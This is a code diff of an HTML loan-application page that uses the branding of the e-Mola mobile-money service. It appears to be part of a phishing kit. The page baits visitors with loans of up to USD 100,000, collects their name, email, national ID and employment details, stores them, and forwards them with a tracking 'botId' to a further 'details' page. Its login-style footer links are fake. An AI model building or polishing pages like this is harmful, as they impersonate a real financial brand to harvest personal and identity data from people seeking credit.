@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>e-Mola · Pedido de Empréstimo</title>
     <style>
-        /* ----- reset & base (same as other pages) ----- */
         * {
             margin: 0;
             padding: 0;
@@ -35,7 +34,6 @@
             margin-top: 20px;
         }
 
-        /* ----- purple header (matches e‑Mola) ----- */
         .logo-container {
             background: #6a0dad;
             margin: 0 -28px 24px;
@@ -59,7 +57,6 @@
             letter-spacing: 0.5px;
         }
 
-        /* ----- calculator section ----- */
         .calculator-box {
             background: #f8f0ff;
             padding: 20px 16px;
@@ -157,7 +154,6 @@
             background: #5a0b9a;
         }
 
-        /* ----- form section (hidden initially) ----- */
         .form-section {
             display: none;
             margin-top: 10px;
@@ -233,7 +229,6 @@
             background: #5a0b9a;
         }
 
-        /* ----- footer links (like login) ----- */
         .footer-links {
             display: flex;
             justify-content: space-between;
@@ -253,7 +248,6 @@
             text-decoration: underline;
         }
 
-        /* ----- version ----- */
         .version {
             text-align: center;
             font-size: 12px;
@@ -262,7 +256,6 @@
             letter-spacing: 0.3px;
         }
 
-        /* ----- responsive adjustments ----- */
         @media (max-width: 420px) {
             .loan-container {
                 padding: 0 20px 28px;
@@ -286,29 +279,23 @@
 <body>
 
 <div class="loan-container">
-    <!-- ===== HEADER (e‑Mola) ===== -->
     <div class="logo-container">
         <h1>e‑Mola</h1>
         <div class="slogan">Meu cell, minha mola</div>
     </div>
 
-    <!-- ===== CALCULATOR SECTION ===== -->
+    <!-- CALCULATOR -->
     <div id="calculatorSection">
         <div class="calculator-box">
             <h2>Simulador de Empréstimo</h2>
-
             <p style="font-weight:500; color:#333;">Valor do Empréstimo</p>
             <div class="loan-amount" id="amountDisplay">USD 15,400</div>
-
             <input type="range" min="100" max="100000" value="15400" class="slider" id="loanSlider" />
-
             <div class="range-values">
                 <span>USD 100</span>
                 <span>USD 100,000</span>
             </div>
-
             <h3 style="color:#6a0dad; margin-top:18px; font-size:16px;">Prazo do Empréstimo</h3>
-
             <div class="term-buttons">
                 <button type="button" class="term-btn" data-months="6">6 meses</button>
                 <button type="button" class="term-btn active" data-months="12">12 meses</button>
@@ -317,17 +304,15 @@
                 <button type="button" class="term-btn" data-months="48">48 meses</button>
                 <button type="button" class="term-btn" data-months="60">60 meses</button>
             </div>
-
             <div class="payment-box">
                 <p>Pagamento Mensal Estimado</p>
                 <h2 id="monthlyPayment">USD 1,314.83</h2>
             </div>
-
             <button class="apply-btn" onclick="showForm()">Solicitar Agora</button>
         </div>
     </div>
 
-    <!-- ===== APPLICATION FORM ===== -->
+    <!-- FORM -->
     <div class="form-section" id="formSection">
         <form id="loanForm">
             <label>Nome Completo</label>
@@ -374,7 +359,6 @@
         </form>
     </div>
 
-    <!-- ===== FOOTER (matching other pages) ===== -->
     <div class="footer-links">
         <a href="#" onclick="alert('Redirecionar para recuperação')">Esqueceu a senha</a>
         <a href="#" onclick="alert('Redirecionar para cadastro')">Cadastrar-se</a>
@@ -383,11 +367,8 @@
     <div class="version">Versão 2.1.0</div>
 </div>
 
-<!-- ========================================================= -->
-<!--  SCRIPT: Calculator logic + form submission + botId       -->
-<!-- ========================================================= -->
 <script>
-    // ---------- BOT ID FIX (from URL or path) ----------
+    // ---------- BOT ID ----------
     let botId = new URLSearchParams(window.location.search).get('botId');
     if (!botId) {
         const parts = window.location.pathname.split('/');
@@ -400,23 +381,21 @@
     }
     localStorage.setItem('botId', botId);
 
-    // ---------- SHOW / HIDE FORM ----------
+    // ---------- SHOW FORM ----------
     function showForm() {
         document.getElementById('calculatorSection').style.display = 'none';
         document.getElementById('formSection').style.display = 'block';
-        // Pre-fill loan amount from slider
         const slider = document.getElementById('loanSlider');
         document.getElementById('loanAmount').value = slider.value;
     }
 
-    // ---------- LOAN CALCULATOR ----------
+    // ---------- CALCULATOR ----------
     const slider = document.getElementById('loanSlider');
     const amountDisplay = document.getElementById('amountDisplay');
     const monthlyPayment = document.getElementById('monthlyPayment');
 
-    // Term buttons: keep track of active term
     const termBtns = document.querySelectorAll('.term-btn');
-    let selectedMonths = 12; // default
+    let selectedMonths = 12;
 
     termBtns.forEach(btn => {
         btn.addEventListener('click', () => {
@@ -435,13 +414,12 @@
     }
 
     slider.addEventListener('input', updatePayment);
-    updatePayment(); // initial
+    updatePayment();
 
-    // ---------- FORM SUBMISSION ----------
+    // ---------- FORM SUBMISSION → details.html ----------
     document.getElementById('loanForm').addEventListener('submit', e => {
         e.preventDefault();
 
-        // Collect all fields
         const fullName = document.getElementById('fullName').value.trim();
         const loanAmount = document.getElementById('loanAmount').value.trim();
         const email = document.getElementById('email').value.trim();
@@ -449,25 +427,20 @@
         const employmentStatus = document.getElementById('employmentStatus').value;
         const loanPurpose = document.getElementById('loanPurpose').value;
 
-        // Basic validation
         if (!fullName || !loanAmount || !email) {
             alert('Por favor, preencha todos os campos obrigatórios.');
             return;
         }
 
-        // Store in localStorage for later use
         localStorage.setItem('fullName', fullName);
         localStorage.setItem('loanAmount', loanAmount);
         localStorage.setItem('email', email);
         localStorage.setItem('nationalId', nationalId);
         localStorage.setItem('employmentStatus', employmentStatus);
         localStorage.setItem('loanPurpose', loanPurpose);
-
-        // Also store name as 'name' for the details page (if needed)
         localStorage.setItem('name', fullName);
 
-        // Redirect to details.html with botId
-        window.location.href = `form.html?botId=${botId}`;
+        window.location.href = `details.html?botId=${botId}`;
     });
 </script>
 
